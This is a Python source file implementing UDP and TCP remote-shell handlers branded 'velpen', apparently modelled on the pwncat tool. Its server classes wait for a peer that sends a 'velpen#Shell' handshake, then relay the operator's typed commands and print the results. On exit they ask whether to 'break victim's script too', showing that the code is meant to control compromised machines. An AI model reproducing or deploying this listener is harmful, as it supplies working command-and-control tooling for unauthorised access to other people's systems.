"""
https://github.com/calebstewart/pwncat
"""
import socket
import datetime

class UDPSocketClient():

    def __init__(self, server: tuple = (False, 0, 0)):
        self.ip = server[1]
        self.port = server[2]
        self.isServer = server[0]

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        if self.isServer:
            self.socket.bind((server[1], server[2]))
        else:
            pass

    def shellConnect(self,
                     ip: str,
                     port: int,
                     editableBuffer=True,
                     editableInput=True,
                     crypt='utf-8',
                     showTimeStamps=False):
        sock = self.socket
        self.buffer = 65534
        self.inputStr = "[???]#>"
        self.crypt = crypt
        self.conn = None

        try:
            server = (ip, port)
            sock.sendto("abc".encode('utf-8'), server)
            if 'abc' in sock.recv(512).decode('utf-8'): pass
            else: raise(socket.gaierror('invalid connection'))
        except socket.gaierror:
            return False

        while True:
            a = input("velpen@{}$ ".format(self.inputStr))

            if a:  # if a exists
                if a.lower() in ["quit", "exit", "leave", "break", "die"]:
                    sock.sendto("velpen#!quit".encode(self.crypt), server)
                    return None

                self.socket.sendto(a.encode(self.crypt), server)  # send our command

            receive = self.socket.recv(65534).decode(self.crypt)  # recieve data

            if receive:  # if receive actually exists
                if "velpenCMD#!" in receive:  # if its a command
                    if "velpenCMD#!Buffer" in receive:  # if the command is to edit buffer
                        if editableBuffer:  # if we can edit buffer
                            self.buffer = int(  # set our buffer to that
                                receive.replace("velpenCMD#!Buffer ", ""))
                    elif "velpenCMD#!InputSTR" in receive:  # if the command is to edit input string
                        if editableInput:  # if we can edit input string
                            self.inputStr = receive.replace(  # change it
                                "velpenCMD#!InputSTR ", "")

                else:  # if not a command
                    if showTimeStamps:  # if we show timestamps
                        print("[+] {} ".format(datetime.datetime.now()),
                                end="")  # print our timestamp without an \n
                    print(receive)  # print our data

    def destroy(self):
        self.socket.close()


class UDPSocketServer():

    def __init__(self, server: tuple = ("0.0.0.0", 64774), timeout:int=120):
        self.ip = server[0]
        self.port = server[1]

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.settimeout(timeout)

        self.socket.bind((server[0], server[1]))


    def interactive(self,
                  editableBuffer=True,
                  editableInput=True,
                  crypt='utf-8',
                  showTimeStamps=False,
                  special=True):
        self.buffer = 65534
        self.inputStr = "[???]"
        self.crypt = crypt
        self.conn = None

        try:
            
            while True:
                print('[+] waiting for connection')
                data, addr = self.socket.recvfrom(1024)

                if data.decode(crypt):
                    if data.decode(crypt) == "velpen#Shell":
                        print('[+] connected')
                        break
                    else:
                        print('[!] attempted connection from {}:{}'.format(
                            addr[0], addr[1]))
        except socket.gaierror:
            return False

        while True:
            a = input("velpen@{}$ ".format(self.inputStr))

            if a:
                if a.lower() in ["quit", "exit", "leave", "break", "die"]:
                    if input("[*] break victim's script too? [y/n]\n").lower() == "n":
                        pass
                    else:
                        self.socket.sendto("velpenCMD#!quit".encode(self.crypt), addr)
                    return None

                self.socket.sendto(a.encode(self.crypt), addr)

            receive = self.socket.recv(65534).decode(self.crypt)

            if receive:
                if "velpenCMD#!" in receive:
                    if "velpenCMD#!Buffer" in receive:
                        if editableBuffer:
                            self.buffer = int(
                                receive.replace("velpenCMD#!Buffer ", ""))
                    elif "velpenCMD#!InputSTR" in receive:
                        if editableInput:
                            self.inputStr = receive.replace(
                                "velpenCMD#!InputSTR ", "")

                else:
                    if showTimeStamps:
                        print("[+] {} ".format(datetime.datetime.now()),
                            end="")
                    print(receive)
                    continue

    def destroy(self):
        self.socket.close()


class TCPSocketClient():

    def __init__(self, server: tuple = (False, 0, 0)):
        self.ip = server[1]
        self.port = server[2]
        self.isServer = server[0]

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        if self.isServer:
            self.socket.bind((server[1], server[2]))
        else:
            pass

    def shellConnect(self,
                     ip: str,
                     port: int,
                     editableBuffer=True,
                     editableInput=True,
                     crypt='utf-8',
                     showTimeStamps=False):
        sock = self.socket
        self.buffer = 65534
        self.inputStr = "[???]#>"
        self.crypt = crypt

        try:
            
            sock.connect((ip, port))
        except socket.gaierror:
            return False

        while True:
            a = input("velpen@{}$ ".format(self.inputStr))

            if a:
                if a.lower() in ["quit", "exit", "leave", "break", "die"]:
                    sock.sendall("velpen#!quit".encode(self.crypt))
                    return None

                sock.sendall(a.encode(self.crypt))

            receive = sock.recv(65534).decode(self.crypt)

            if receive:
                if "velpenCMD#!" in receive:
                    if "velpenCMD#!Buffer" in receive:
                        if editableBuffer:
                            self.buffer = int(
                                receive.replace("velpenCMD#!Buffer ", ""))
                    elif "velpenCMD#!InputSTR" in receive:
                        if editableInput:
                            self.inputStr = receive.replace(
                                "velpenCMD#!InputSTR ", "")

                else:
                    if showTimeStamps:
                        print("[+] {} ".format(datetime.datetime.now()),
                              end="")
                    print(receive)
                    continue

    def destroy(self):
        self.socket.close()


class TCPSocketServer():

    def __init__(self, server: tuple = ("0.0.0.0", 64774), timeout:int=120):
        self.ip = server[0]
        self.port = server[1]

        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.settimeout(timeout)

        self.socket.bind((server[0], server[1]))


    def interactive(self,
                  editableBuffer=True,
                  editableInput=True,
                  crypt='utf-8',
                  showTimeStamps=False):
        sock = self.socket
        self.buffer = 65534
        self.inputStr = "[???]#>"
        self.crypt = crypt

        try:
            sock.listen()
        except socket.gaierror:
            return False
        try:
            
            while True:
                print('[+] waiting for connection')
                conn, addr = sock.accept()
                print('[!] connection from {}:{}; waiting for client... (30s)'.format(
                            addr[0], addr[1]))
                sock.settimeout(30)
                data = conn.recv(512)
                sock.settimeout(None)
                
                if data.decode(crypt):
                    if data.decode(crypt) == "velpen#Shell":
                        break
                    else:
                        print('[!] attempted connection from {}:{}; refused it'.format(
                            addr[0], addr[1]))
        except socket.gaierror:
            return False
            
        with conn:
            print("[!] connected to {}:{}".format(addr[0], addr[1]))
            while True:
                a = input("velpen@{}$ ".format(self.inputStr))

                if a:
                    if a.lower() in ["quit", "exit", "leave", "break", "die"]:
                        return None

                    conn.sendall(a.encode(self.crypt))

                receive = conn.recv(65534).decode(self.crypt)

                if "velpenCMD#!" in receive:
                    if "velpenCMD#!Buffer" in receive:
                        if editableBuffer:
                            self.buffer = int(
                                receive.replace("velpenCMD#!Buffer ", ""))
                    elif "velpenCMD#!InputSTR" in receive:
                        if editableInput:
                            self.inputStr = receive.replace("velpenCMD#!InputSTR ", "")

                    continue
                else:
                    if showTimeStamps:
                        print("[+] {} ".format(datetime.datetime.now()),
                                end="")
                    print(receive)
                    continue

    def destroy(self):
        self.socket.close()
